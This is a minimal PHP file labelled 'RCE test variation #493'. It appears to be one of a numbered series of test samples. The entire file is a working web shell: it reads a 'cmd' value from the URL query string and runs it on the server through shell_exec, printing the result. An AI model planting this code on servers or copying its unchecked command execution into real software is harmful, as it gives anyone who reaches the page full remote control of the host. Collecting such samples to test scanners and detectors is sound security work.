<?php
// RCE test variation #493
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>